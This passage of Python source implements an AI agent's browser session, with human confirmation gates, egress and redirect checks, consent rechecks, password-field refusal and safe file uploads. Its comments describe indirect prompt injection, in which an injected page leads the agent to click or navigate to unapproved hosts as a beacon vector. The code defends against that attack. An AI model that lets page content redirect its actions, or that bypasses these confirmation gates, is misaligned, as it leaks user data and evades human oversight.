        Sets ``_closed`` FIRST so any queued ``_ensure_started`` bails instead of
        relaunching Chromium onto a popped session (the resurrection-zombie bug),
        then serializes with ``_start_lock`` so a close racing an in-flight
        ``start()`` cannot stop the driver mid-launch. Safe to call twice (the
        chat auto_close finally + an explicit REST close can race): the second
        call sees ``_pw is None`` and no-ops rather than double-stopping the
        Playwright driver."""
        already = self._closed
        self._closed = True
        # Cancel the fire-and-forget new-tab guards up front (review H3).
        for t in list(self._guard_tasks):
            t.cancel()
        self._guard_tasks.clear()
        async with self._start_lock:
            if already and self._pw is None:
                return                       # a concurrent close() already tore down
            if self._screencast_task:
                self._screencast_task.cancel()
                try:
                    await self._screencast_task     # drain the in-flight frame cleanly
                except (asyncio.CancelledError, Exception):  # noqa: BLE001
                    pass
                self._screencast_task = None
            try:
                if self._attached:
                    # ADR-0200 detach: the browser is the USER'S real Chrome.
                    # NEVER close the context (that would close their tabs) and
                    # NEVER rmtree (there is no managed profile — it is theirs).
                    # Just disconnect the CDP link; their Chrome keeps running.
                    if self._browser is not None:
                        with contextlib.suppress(Exception):
                            await self._browser.close()   # disconnect, not kill
                elif self._context:
                    await self._context.close()
            finally:
                if self._pw:
                    await self._pw.stop()
                self._pw = self._browser = self._context = self._page = None
                # L3: wipe the persistent profile (cookies/localStorage/auth) — the
                # ephemeral managed session must not leave credentials on disk.
                # Attach mode has no managed profile (the guard below is false),
                # so the user's real profile is never touched.
                try:
                    import shutil
                    if getattr(self, "_user_data", None) and self._user_data.exists():
                        shutil.rmtree(self._user_data, ignore_errors=True)
                except Exception:  # noqa: BLE001
                    pass

    def _require_page(self):
        if self._page is None:
            raise BrowserActionError("session not started")
        return self._page

    def _emit(self, action: str, **kw: Any) -> None:
        rec = {"action": action, "session": self.session_id, **kw}
        if self._on_action is not None:
            try:
                self._on_action(rec)
            except Exception:  # noqa: BLE001
                pass

    def _mark_disconnected(self) -> None:
        """Browser/context went away (crash, or the user quit their real Chrome).
        Sync event callback — just flip the flag and drop one action-log line so
        the live view shows WHY it stopped, rather than freezing silently."""
        if self._disconnected:
            return
        self._disconnected = True
        with contextlib.suppress(Exception):
            self._emit("browser_disconnected", ok=False,
                       reason=("your Chrome was closed" if self._attached
                               else "the browser process exited"))

    def _guard_active(self, action: str) -> None:
        # Browser gone (review F3): fail fast + actionable instead of a raw
        # 'Target closed' → HTTP 500 and a frozen live view.
        if self._disconnected:
            raise BrowserActionError(
                "the browser was closed" + (" (your Chrome quit)" if self._attached
                else " (it crashed or exited)") + " — this session is over; "
                "start a new one")
        # Per-action consent recheck for attached sessions (review finding): the
        # real-chrome consent was checked at session CREATE only, so an expired
        # TTL or an explicit Revoke did NOT stop an already-running session from
        # driving the user's real Chrome. Now every action re-checks; a lapsed
        # consent refuses further actions (the session must be re-consented or
        # closed). Fail-closed: a missing/erroring check refuses.
        if self._attached and self._consent_ok is not None:
            try:
                ok = self._consent_ok()
            except Exception:  # noqa: BLE001
                ok = False
            if not ok:
                raise BrowserActionError(
                    "real-chrome consent expired or was revoked — re-grant it in "
                    "the console (Browser → Attach) or close this session")
        if self.paused:
            raise BrowserActionError(
                f"blocked: session is paused / under user take-over ({action})")

    # ── shared sensitivity + egress gates (used by every commit-capable action) ─
    async def _confirm_sensitive_or_raise(
        self, action: str, *, host: str, role: str = "", name: str = "",
        url: str = "", form_sensitive: bool = False, index: int | None = None,
    ) -> None:
        """Human-in-the-loop gate shared by click / key / select_option / drag.

        MUST be called with the page lock NOT held — the confirm can block for up
        to the broker timeout and we want the live screencast to keep updating
        while the user decides. Fail-closed: a sensitive action with no confirm
        broker wired is blocked (never auto-approved); a declined one raises."""
        if not _cmp.is_sensitive(action, role=role, name=name, url=url,
                                 form_has_sensitive_field=form_sensitive):
            return
        if self._confirm is None:
            _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                              action=action, host=host, role=role, index=index, ok=False,
                              extra={"reason": "no_confirm_broker"})
            self._emit(action, index=index, role=role, name=name, ok=False,
                       reason="no_confirm_broker")
            raise BrowserActionError(
                f"sensitive {action} on '{name}' blocked: no confirmation channel")
        approved = await self._confirm(action=action, host=host, role=role, name=name)
        if not approved:
            _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                              action=action, host=host, role=role, index=index, ok=False,
                              extra={"reason": "user_declined_sensitive"})
            self._emit(action, index=index, role=role, name=name, ok=False,
                       reason="user_declined_sensitive")
            raise BrowserActionError(f"sensitive {action} on '{name}' declined by user")

    async def _recheck_landing_egress_locked(
        self, action: str, *, role: str = "", index: int | None = None,
    ) -> None:
        """Re-validate the CURRENT landing host after an act that may have
        navigated (a click's <a href>, a key('Enter') form submit, a
        <select onchange=location=…>, a drag-to-confirm). Assumes ``_page_lock``
        is held. Fail-closed: a denied destination is parked on about:blank and
        the action refused, exactly like navigate()'s redirect guard."""
        page = self._require_page()
        fdec = _cmp.check_egress(page.url, allowlist=self._allowlist, forbidden=self._forbidden)
        if not fdec.allowed:
            try:
                await page.goto("about:blank")
            except Exception:  # noqa: BLE001
                pass
            _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                              action=action, host=fdec.host, role=role, index=index, ok=False,
                              extra={"reason": "nav_" + fdec.reason})
            self._emit(action, index=index, role=role, ok=False, reason="navigation blocked")
            raise BrowserActionError(
                f"{action} navigated to disallowed host {fdec.host}: {fdec.reason}")

    async def _confirm_cross_host_or_park(
        self, action: str, *, prev_host: str, role: str = "", index: int | None = None,
    ) -> None:
        """Post-landing indirect-prompt-injection guard shared by click / key-submit
        / select_option / drag / navigate's redirect (BR-F1).

        navigate()'s PRE-navigation cross-host confirm used to be the ONLY place
        this defense ran; every other navigating action only rechecked the (in the
        default config, EMPTY) egress allowlist — so an injected page could get the
        agent to CLICK a link and hop to any host with no confirmation, feeding
        that host's content straight back into the planner. This runs AFTER an
        action has landed: when NO allowlist is configured and the landing host
        differs from where the action started, it requires the SAME human confirm
        as navigate(), so a cross-host transition via ANY action is gated, not just
        navigate().

        MUST be called with the page lock NOT held — the confirm can block up to
        the broker timeout and the live screencast must keep updating while the
        user decides (mirrors ``_confirm_sensitive_or_raise``). A declined hop
        parks the page on about:blank and raises, exactly like navigate()'s
        redirect guard.

        Only the no-allowlist mode uses this: with an allowlist set, the
        fail-closed landing-egress recheck (run under the lock, BEFORE this)
        already constrains every landing host and an on-allowlist host is
        pre-approved policy — so the allowlist-first ordering is preserved. With no
        confirm broker wired there is nothing to ask, matching navigate()."""
        if self._allowlist is not None or self._confirm is None:
            return
        landing = _cmp._host(self._require_page().url)
        if not landing or landing == (prev_host or ""):
            return
        # ADR-0189 task-scope carve-out (same as navigate()): a host the user's own
        # task text named is already informed consent for THAT host — auto-approve
        # with no prompt. Only a host the task never named (the real injection
        # surface: the agent hopping somewhere off its own bat) reaches the confirm.
        if self._task_scoped_hosts and _host_task_scoped(landing, self._task_scoped_hosts):
            _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                              action=action, host=landing, role=role, index=index, ok=True,
                              extra={"reason": "task_scoped_auto_approved"})
            return
        # SECURITY: pass the HOST only, never the full URL — a full URL can carry a
        # ?token=/reset secret and the live action-log + audit trail are host-only.
        approved = await self._confirm(action=action, host=landing, role="navigation", name=landing)
        if not approved:
            async with self._page_lock:
                with contextlib.suppress(Exception):
                    await self._require_page().goto("about:blank")
            _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                              action=action, host=landing, role=role, index=index, ok=False,
                              extra={"reason": "user_declined_cross_host"})
            self._emit(action, index=index, role=role, ok=False, reason="cross-host declined")
            raise BrowserActionError(
                f"{action} navigated cross-host to {landing} declined")

    async def _act_and_settle(self, page, do: Callable[[], Awaitable[Any]]) -> None:
        """Run the page-mutating coroutine ``do`` and, when an egress policy is
        configured, wait (bounded) for any navigation it triggers to SETTLE
        before returning — so a subsequent ``_recheck_landing_egress_locked``
        sees the real destination, not a stale pre-navigation url.

        Needed because ``page.keyboard.press`` / ``select_option`` / a drag do
        NOT auto-wait for a navigation the way ``ElementHandle.click`` does — a
        form submitted via Enter starts navigating asynchronously, so an
        immediate ``page.url`` read still shows the old host and the egress
        recheck would be a no-op (fail-OPEN). When no allowlist/forbidden is set
        AND no confirm broker is wired the recheck is a no-op anyway, so we skip
        the wait to keep that path fast. But with a confirm broker present (the
        agent path) the post-landing cross-host confirm (BR-F1) needs the REAL
        destination, so we must still settle the navigation even with no allowlist.
        Assumes ``_page_lock`` is held."""
        if self._allowlist is None and not self._forbidden and self._confirm is None:
            await do()
            return
        from playwright.async_api import Error as PWError, TimeoutError as PWTimeout
        try:
            async with page.expect_navigation(timeout=3000):
                await do()
        except PWTimeout:
            pass   # the action did not navigate — that is fine, recheck the current url
        except PWError:
            # The navigation was aborted at the network layer — the per-request
            # egress route (HIGH-1) refuses an off-allowlist / metadata document
            # request, surfacing as net::ERR_FAILED/ERR_ABORTED here. That IS the
            # block working: the page stays on the current (allowed) host, so the
            # landing recheck below is a no-op. Swallow it rather than leaking a
            # raw Playwright error out of a commit action.
            pass

    # ── actions ──────────────────────────────────────────────────────────────
    async def navigate(self, url: str, *, confirm_cross_host: bool = False) -> Observation:
        self._guard_active("navigate")
        await self._ensure_started()
        decision = _cmp.check_egress(url, allowlist=self._allowlist, forbidden=self._forbidden)
        if not decision.allowed:
            _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                              action="navigate", host=decision.host, ok=False,
                              extra={"reason": decision.reason})
            self._emit("navigate", host=decision.host, ok=False, reason=decision.reason)
            raise BrowserActionError(f"egress denied for {decision.host}: {decision.reason}")
        # Injection defense for the AUTONOMOUS agent: when no egress allowlist is
        # configured, a cross-host navigation (the classic indirect-prompt-
        # injection → beacon vector) requires human confirmation. Manual operator
        # navigation (confirm_cross_host=False) is never gated.
        if confirm_cross_host and self._allowlist is None and self._confirm is not None:
            cur = _cmp._host(self._require_page().url)
            # A falsy `cur` (fresh session on about:blank, no host yet) must NOT
            # skip the confirm — that would let the agent's very FIRST hop of a
            # session go unconfirmed regardless of destination.
            if decision.host and (not cur or decision.host != cur):
                # ADR-0189: a host the user's own task text named is already
                # informed consent for THAT host — auto-approve with no prompt.
                # Anything else (the actual indirect-prompt-injection surface:
                # the agent deciding on its own, from page content, to hop
                # somewhere the user never mentioned) is unchanged below.
                if self._task_scoped_hosts and _host_task_scoped(decision.host, self._task_scoped_hosts):
                    _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                                      action="navigate", host=decision.host, ok=True,
                                      extra={"reason": "task_scoped_auto_approved"})
                    self._emit("navigate", host=decision.host, ok=True, reason="task-scoped, auto-approved")
                else:
                    # SECURITY: pass the HOST only, never the full URL — the confirm
                    # `name` is written verbatim into the live action-log ring buffer
                    # and the pending() payload, and a full URL can carry a
                    # ?token=/reset secret. The audit trail is already host-only
                    # (below); the live view must not leak more than the audit trail.
                    approved = await self._confirm(action="navigate", host=decision.host,
                                                   role="navigation", name=decision.host)
                    if not approved:
                        _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                                          action="navigate", host=decision.host, ok=False,
                                          extra={"reason": "user_declined_cross_host"})
                        self._emit("navigate", host=decision.host, ok=False, reason="cross-host declined")
                        raise BrowserActionError(f"cross-host navigation to {decision.host} declined")
        async with self._page_lock:
            page = self._require_page()
            self._last_marks = []       # stamps from the old page are gone
            self._mark_frame = {}       # old frames are gone/detached too
            await page.goto(url, wait_until="domcontentloaded")
            # Redirect guard: the server may 3xx to another host. Re-check the
            # FINAL landing url against the same policy; a denied redirect is
            # parked on about:blank and refused (fail-closed).
            final = page.url
            fdec = _cmp.check_egress(final, allowlist=self._allowlist, forbidden=self._forbidden)
            if not fdec.allowed:
                try:
                    await page.goto("about:blank")
                except Exception:  # noqa: BLE001
                    pass
                _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                                  action="navigate", host=fdec.host, ok=False,
                                  extra={"reason": "redirect_" + fdec.reason})
                self._emit("navigate", host=fdec.host, ok=False, reason="redirect blocked")
                raise BrowserActionError(f"egress denied after redirect to {fdec.host}: {fdec.reason}")
        # BR-F1: a server 3xx to a DIFFERENT host than the agent-approved target is
        # a fresh cross-host hop the human never approved — with no allowlist the
        # redirect guard above only rechecked the (empty) allowlist, so confirm the
        # redirect landing too (agent path only; a manual navigate stays ungated).
        # Runs OUTSIDE the lock so the confirm can block without freezing the
        # screencast; a same-host landing (the common case) is a no-op.
        if confirm_cross_host:
            await self._confirm_cross_host_or_park("navigate", prev_host=decision.host)
        async with self._page_lock:
            _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                              action="navigate", host=fdec.host, ok=True)
            # L1: action log carries HOST only, never the full URL (which could
            # hold ?token=/reset links). The full url stays local to the browser.
            self._emit("navigate", host=fdec.host, ok=True)
            return await self._observe_locked()

    async def observe(self) -> Observation:
        self._guard_active("observe")
        await self._ensure_started()
        async with self._page_lock:
            return await self._observe_locked()

    async def _observe_locked(self) -> Observation:
        """Collect Set-of-Marks from the main document AND every same-page
        iframe (ADR-0183 S2) — same-origin or cross-origin: Playwright's
        ``Frame.evaluate`` reaches iframe content regardless of origin, which
        is exactly what makes a payment widget (Stripe/PayPal) visible to the
        agent instead of an invisible black box. All frames share ONE global,
        MAX_MARKS-bounded index space; ``self._mark_frame`` remembers which
        frame produced which index so ``_resolve()`` can query the right one.
        Backward compatible: a page with no iframes collects exactly as
        before (single frame, offset 0).
        """
        page = self._require_page()
        main = page.main_frame
        try:
            frames = list(page.frames)
        except Exception:  # noqa: BLE001
            frames = [main]
        ordered = [main] + [f for f in frames if f is not main]

        marks: list[Mark] = []
        mark_frame: dict[int, Any] = {}
        url = page.url
        title = ""
        for frame in ordered:
            remaining = MAX_MARKS - len(marks)
            if remaining <= 0:
                break
            try:
                data = await frame.evaluate(_COLLECT_JS, {"maxMarks": remaining, "offset": len(marks)})
            except Exception:  # noqa: BLE001 — detached/navigating/restricted frame: skip it
                continue
            if frame is main:
                url = data.get("url", url)
                title = data.get("title", "")
            for m in data.get("marks", []):
                mark = Mark(**m)
                marks.append(mark)
                mark_frame[mark.index] = frame

        self._last_marks = marks
        self._mark_frame = mark_frame
        obs = Observation(url=url, title=title, marks=marks)
        host = _cmp._host(obs.url)
        _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                          action="observe", host=host, ok=True, extra={"count": len(marks)})
        self._emit("observe", host=host, count=len(marks))    # host only, not full url
        return obs

    async def _resolve(self, index: int, *, verify_fresh: bool = True):
        """Resolve mark ``index`` to a live element handle.

        ADR-0183 S1 stale-mark self-healing: before handing the element back
        to an actor (click/fill/fill_secret/read), re-derive its accessible-name
        fingerprint (same priority order as ``accName()`` in marks.py, never
        ``el.value``) and compare it against the ``Mark.name`` captured at the
        last ``observe()``. A mismatch means the page re-rendered in place
        since the last observe (the index now points at a DIFFERENT logical
        control) — raise ``StaleMarkError`` instead of silently acting on a
        possibly-wrong element. The check only fires when BOTH names are
        non-empty (an empty name carries no signal either way).

        ADR-0183 S2 iframe traversal: resolves against the FRAME that
        actually produced this index (``self._mark_frame``), not always the
        top-level page — a Playwright ``Frame`` exposes the same
        ``query_selector``/``evaluate`` surface as ``Page``, so this stays a
        drop-in. Indices with no recorded frame (pages with no iframes,
        pre-S2 behavior) fall back to the current page.
        """
        page = self._require_page()
        frame = self._mark_frame.get(index, page)
        el = await frame.query_selector(f'[data-corvin-mark="{index}"]')
        if el is None:
            raise BrowserActionError(
                f"mark [{index}] not found — the page changed; call observe() again")
        if verify_fresh:
            mark = self._mark(index)
            if mark is not None and mark.name:
                try:
                    live_name = await el.evaluate(_FINGERPRINT_JS)
                except Exception:  # noqa: BLE001 — resolution hiccup, not proof of staleness
                    live_name = None
                if isinstance(live_name, str) and live_name.strip() and live_name.strip() != mark.name:
                    raise StaleMarkError(
                        f"stale mark [{index}]: page changed since last observe() — "
                        f"call observe() again")
        return el

    async def _refuse_if_live_password(self, el, index: int, action: str) -> None:
        """ADR-0189 defense-in-depth: fill()/fill_secret() must never type into
        a LIVE password-type element, even if the mark captured at the last
        observe() said otherwise. Under normal operation the agent-loop's
        needs_login pause already stops the whole loop before the planner is
        ever asked to plan against a password mark — this is the backstop for
        the narrow TOCTOU window where a field flips from a plain textbox to
        type="password" (e.g. a progressive-disclosure login step) DURING the
        planner's own decision latency, between the last observe() and this
        call. Never raises on a resolution hiccup — defaults to "not a
        password field" rather than blocking unrelated fills on an eval error."""
        try:
            is_pw = bool(await el.evaluate("el => (el.type || '').toLowerCase() === 'password'"))
        except Exception:  # noqa: BLE001
            is_pw = False
        if is_pw:
            raise StaleMarkError(
                f"{action} target [{index}] is a password field — the agent may never "
                f"type into it; log in manually in the live view, then /browser continue")

    async def _form_sensitive_hint(self, index: int) -> bool:
        """Best-effort: does the <form> enclosing mark ``index`` contain a
        password or card-number field? (Sensitivity model v2, ADR-0183 S1.)

        Never raises — any resolution/eval failure defaults to False. This is
        only a RECALL-raising hint for ``is_sensitive()``; it never replaces
        the fail-closed backstop in ``_resolve()`` (missing/stale mark) that
        runs on the actual action right before it executes.
        """
        try:
            async with self._page_lock:
                page = self._require_page()
                frame = self._mark_frame.get(index, page)
                el = await frame.query_selector(f'[data-corvin-mark="{index}"]')
                if el is None:
                    return False
                return bool(await el.evaluate(_FORM_SENSITIVE_JS))
        except Exception:  # noqa: BLE001
            return False

    def _mark(self, index: int) -> Mark | None:
        for m in self._last_marks:
            if m.index == index:
                return m
        return None

    async def click(self, index: int) -> None:
        self._guard_active("click")
        await self._ensure_started()
        mark = self._mark(index)
        role = mark.role if mark else ""
        name = mark.name if mark else ""
        url = self._require_page().url
        host = _cmp._host(url)
        # Sensitivity model v2 (ADR-0183 S1): URL-path + form-context signals,
        # additive to the v1 name-keyword match. Best-effort — a resolution
        # failure here defaults form_has_sensitive_field=False rather than
        # raising; the later _resolve() staleness/missing-mark check remains
        # the fail-closed backstop for the actual click.
        form_sensitive = await self._form_sensitive_hint(index)
        # Human-in-the-loop confirmation happens OUTSIDE the page lock so the live
        # screencast keeps updating while the user decides. Fail-closed inside the
        # shared helper (no broker → blocked; declined → raised).
        await self._confirm_sensitive_or_raise(
            "click", host=host, role=role, name=name, url=url,
            form_sensitive=form_sensitive, index=index)
        self._guard_active("click")   # re-check: user may have paused during confirm
        async with self._page_lock:
            el = await self._resolve(index)
            # TOCTOU re-check (review M1): the sensitivity decision above was made
            # on pre-lock state, and there are await boundaries (up to the full
            # confirm timeout) before we actually click. If the page swapped the
            # form under this element (benign "Continue" → payment form) or
            # pushState'd onto a /checkout path in that window, re-evaluate on the
            # LIVE element/url; a benign→sensitive transition that we never
            # confirmed must refuse, not click through unconfirmed.
            try:
                live_url = self._require_page().url
                live_form_sensitive = bool(await el.evaluate(_FORM_SENSITIVE_JS))
            except Exception:  # noqa: BLE001
                live_url, live_form_sensitive = url, form_sensitive
            if (_cmp.is_sensitive("click", role=role, name=name, url=live_url,
                                  form_has_sensitive_field=live_form_sensitive)
                    and not _cmp.is_sensitive("click", role=role, name=name, url=url,
                                              form_has_sensitive_field=form_sensitive)):
                raise StaleMarkError(
                    f"click target [{index}] became sensitive since the confirm "
                    f"decision — call observe() again and retry")
            await el.click(timeout=self._nav_timeout)
            self._last_marks = []      # a click may have navigated — force re-observe
            self._mark_frame = {}      # old frames (if any) are gone/detached too
            # C1 egress guard: a click can navigate anywhere (e.g. an <a href> to an
            # off-allowlist host). Re-validate the LANDING host, fail-closed.
            await self._recheck_landing_egress_locked("click", role=role, index=index)
        # BR-F1: a click that hops to a DIFFERENT host with no allowlist is the
        # indirect-prompt-injection vector navigate()'s confirm was meant to stop —
        # gate it too (outside the lock so the screencast keeps updating).
        await self._confirm_cross_host_or_park("click", prev_host=host, role=role, index=index)
        _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                          action="click", host=host, role=role, index=index, ok=True)
        self._emit("click", index=index, role=role, name=name, ok=True)

    async def fill(self, index: int, text: str) -> None:
        """Type a value into a field. The value is NEVER audited or logged."""
        self._guard_active("fill")
        await self._ensure_started()
        mark = self._mark(index)
        role = mark.role if mark else ""
        # Sensitivity model v2 (ADR-0183 S1): fill itself stays never-auto-
        # sensitive (typing is reversible — is_sensitive() short-circuits for
        # action="fill" regardless of these signals; see compliance.py), but
        # the form-context hint is still computed and recorded as metadata so
        # a fill into a password/card-number-bearing form is visible in the
        # audit trail even though the confirm gate only fires on the eventual
        # submit/click that commits it.
        form_sensitive = await self._form_sensitive_hint(index)
        async with self._page_lock:
            host = _cmp._host(self._require_page().url)
            el = await self._resolve(index)
            await self._refuse_if_live_password(el, index, "fill")
            await el.fill(text)
        _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                          action="fill", host=host, role=role, index=index, ok=True,
                          extra={"chars": len(text),          # length only, never the value
                                 "form_sensitive_context": form_sensitive})
        self._emit("fill", index=index, role=role, ok=True, chars=len(text))

    async def fill_secret(self, index: int, vault_key: str) -> None:
        """Type a secret resolved from the vault. The value never enters the model
        context, the action log, or the audit trail — only the vault key name."""
        self._guard_active("fill_secret")
        await self._ensure_started()
        if self._vault is None:
            raise BrowserActionError("no vault resolver configured")
        value = self._vault(vault_key)
        if not value:
            raise BrowserActionError(f"vault key '{vault_key}' not found")
        async with self._page_lock:
            host = _cmp._host(self._require_page().url)
            el = await self._resolve(index)
            # ADR-0189: autofilling a LIVE password field via the vault is an
            # explicit non-goal of the login-pause design — the human types
            # their own password, always, in this phase. Under normal
            # operation the needs_login pause already stops the loop before
            # the planner is ever asked to plan against a password mark;
            # this is the TOCTOU backstop for a field that flips to
            # type="password" during the planner's own decision latency.
            await self._refuse_if_live_password(el, index, "fill_secret")
            await el.fill(value)
        del value      # drop the secret from this frame promptly
        _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                          action="fill_secret", host=host, index=index, ok=True,
                          extra={"vault_key": vault_key})   # key name only, never the value
        self._emit("fill_secret", index=index, ok=True, vault_key=vault_key)

    async def read(self, index: int | None = None, *, max_chars: int = 4000) -> str:
        self._guard_active("read")
        await self._ensure_started()
        async with self._page_lock:
            page = self._require_page()
            host = _cmp._host(page.url)
            if index is not None:
                el = await self._resolve(index)
                txt = (await el.inner_text()) or ""
            else:
                txt = await page.evaluate(
                    "() => document.body ? (document.body.innerText || '') : ''")
        n = min(len(txt), max_chars)
        _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                          action="read", host=host, index=index, ok=True, extra={"chars": n})
        self._emit("read", index=index, chars=n)
        return txt[:max_chars]

    async def scroll(self, direction: str = "down") -> None:
        self._guard_active("scroll")
        await self._ensure_started()
        dy ={"down": 600, "up": -600, "top": -100000, "bottom": 100000}.get(direction, 600)
        async with self._page_lock:
            await self._require_page().evaluate("(dy) => window.scrollBy(0, dy)", dy)
        self._emit("scroll", direction=direction)

    async def back(self) -> Observation:
        self._guard_active("back")
        await self._ensure_started()
        async with self._page_lock:
            page = self._require_page()
            self._last_marks = []
            self._mark_frame = {}
            await page.go_back(wait_until="domcontentloaded")
            self._emit("back")
            return await self._observe_locked()

    # ── ADR-0183 S2: expanded action surface ────────────────────────────────
    async def hover(self, index: int) -> None:
        """Hover the element at ``index`` (e.g. to reveal a hover-only menu)
        without clicking it. Goes through the same stale-mark ``_resolve()``
        check as every other action."""
        self._guard_active("hover")
        await self._ensure_started()
        mark = self._mark(index)
        role = mark.role if mark else ""
        async with self._page_lock:
            host = _cmp._host(self._require_page().url)
            el = await self._resolve(index)
            await el.hover(timeout=self._nav_timeout)
        _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                          action="hover", host=host, role=role, index=index, ok=True)
        self._emit("hover", index=index, role=role, ok=True)

    async def key(self, key: str) -> None:
        """Press a single named key (Enter/Tab/Escape/Arrow*/…) on the page.

        SECURITY: ``key`` must be on ``ALLOWED_KEYS`` — an arbitrary string
        (or a modifier combo like "Control+A") is rejected rather than passed
        straight to Playwright's keyboard, since some combos trigger browser/
        OS-level behavior (devtools, paste, select-all) never vetted for this
        surface. Fail-closed: an unknown key raises, nothing is pressed.
        """
        self._guard_active("key")
        await self._ensure_started()
        if key not in ALLOWED_KEYS:
            raise BrowserActionError(
                f"key '{key}' is not in the allowed key set ({sorted(ALLOWED_KEYS)})")
        url = self._require_page().url
        host = _cmp._host(url)
        # A commit key (Enter/Space) can submit the focused form without any
        # click — gate it through the SAME sensitivity confirm as a click, using
        # the current page path + whether the FOCUSED element's form carries a
        # password/card field. Closes the "Enter bypasses the sensitivity gate"
        # hole (the previously-dead is_sensitive("submit", …) branch).
        if key in _COMMIT_KEYS:
            active_sensitive = False
            try:
                async with self._page_lock:
                    active_sensitive = bool(
                        await self._require_page().evaluate(_ACTIVE_FORM_SENSITIVE_JS))
            except Exception:  # noqa: BLE001 — best-effort hint, never blocks on eval error
                active_sensitive = False
            await self._confirm_sensitive_or_raise(
                "submit", host=host, name=key, url=url, form_sensitive=active_sensitive)
            self._guard_active("key")   # re-check: user may have paused during confirm
        async with self._page_lock:
            page = self._require_page()
            # A committed form submit can navigate anywhere — wait for the nav to
            # settle, then re-validate the landing host fail-closed (same as click).
            if key in _COMMIT_KEYS:
                self._last_marks = []
                self._mark_frame = {}
                await self._act_and_settle(page, lambda: page.keyboard.press(key))
                await self._recheck_landing_egress_locked("key")
            else:
                await page.keyboard.press(key)
        # BR-F1: an Enter/Space submit can navigate cross-host just like a click —
        # gate a no-allowlist cross-host hop through the same confirm (outside the
        # lock). Only commit keys can navigate, so only they need the check.
        if key in _COMMIT_KEYS:
            await self._confirm_cross_host_or_park("key", prev_host=host)
        # The key NAME itself ("Enter") is not sensitive content — it is
        # metadata about the action, not typed text — so it is safe to audit,
        # unlike a fill() value.
        _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                          action="key", host=host, ok=True, extra={"key": key})
        self._emit("key", key=key, ok=True)

    async def select_option(self, index: int, value: str) -> None:
        """Choose an option (by its ``value`` attribute) in the <select> at
        ``index``. Like ``fill()``, the chosen value is never audited/logged
        — only its length — since a selected option can itself carry
        sensitive context (e.g. a country/insurance-plan choice)."""
        self._guard_active("select_option")
        await self._ensure_started()
        mark = self._mark(index)
        role = mark.role if mark else ""
        url = self._require_page().url
        host = _cmp._host(url)
        # A <select onchange="location=…"> commits + navigates like a click —
        # gate it through the same sensitivity confirm (url path + enclosing-form
        # context) and re-check the landing host afterwards.
        form_sensitive = await self._form_sensitive_hint(index)
        await self._confirm_sensitive_or_raise(
            "click", host=host, role=role, name=mark.name if mark else "", url=url,
            form_sensitive=form_sensitive, index=index)
        self._guard_active("select_option")
        async with self._page_lock:
            page = self._require_page()
            el = await self._resolve(index)
            self._last_marks = []
            self._mark_frame = {}
            await self._act_and_settle(page, lambda: el.select_option(value=value))
            await self._recheck_landing_egress_locked("select_option", role=role, index=index)
        # BR-F1: a <select onchange=location=…> can hop cross-host — gate a
        # no-allowlist cross-host landing through the same confirm (outside lock).
        await self._confirm_cross_host_or_park("select_option", prev_host=host, role=role, index=index)
        _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                          action="select_option", host=host, role=role, index=index, ok=True,
                          extra={"chars": len(value)})   # length only, never the value
        self._emit("select_option", index=index, role=role, ok=True)

    async def upload_file(self, index: int, filename: str) -> None:
        """Attach a file to the file-input at ``index``.

        SECURITY: ``filename`` is NOT an arbitrary host path. Accepting one
        would let an untrusted page/agent read arbitrary files off the
        operator's disk (path traversal / LFI) via a file-input's
        ``set_input_files``. Instead, a file may only be attached if it
        ALREADY exists under this session's dedicated uploads directory —
        ``<tenant browser home>/sessions/<session_id>/uploads/`` — created
        lazily on first use. Any ``..`` path component or an absolute path is
        rejected outright; the final resolved path is then re-verified to
        still be inside the uploads dir before Playwright ever touches it
        (fail-closed against normalization/symlink tricks). An operator (or a
        prior, explicitly-approved step) must place the file there first —
        this method never fetches or writes file content itself.
        """
        self._guard_active("upload_file")
        await self._ensure_started()
        uploads_dir = self._home / "sessions" / self.session_id / "uploads"
        uploads_dir.mkdir(parents=True, exist_ok=True)
        raw = (filename or "").strip()
        if not raw or Path(raw).is_absolute() or ".." in Path(raw).parts:
            raise BrowserActionError(f"invalid upload filename: {filename!r}")
        uploads_resolved = uploads_dir.resolve()
        candidate = (uploads_dir / raw).resolve()
        if candidate != uploads_resolved and uploads_resolved not in candidate.parents:
            raise BrowserActionError(f"upload path escapes the session uploads dir: {filename!r}")
        if not candidate.is_file():
            raise BrowserActionError(
                f"upload file not found: {filename!r} (place it under {uploads_dir})")
        mark = self._mark(index)
        role = mark.role if mark else ""
        async with self._page_lock:
            host = _cmp._host(self._require_page().url)
            el = await self._resolve(index)
            await el.set_input_files(str(candidate))
        _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                          action="upload_file", host=host, role=role, index=index, ok=True,
                          extra={"filename": raw})   # filename only — never file content
        self._emit("upload_file", index=index, role=role, ok=True, filename=raw)

    async def drag(self, from_index: int, to_index: int) -> None:
        """Drag the element at ``from_index`` onto the element at
        ``to_index`` via a manual hover + mouse down/move/up sequence (more
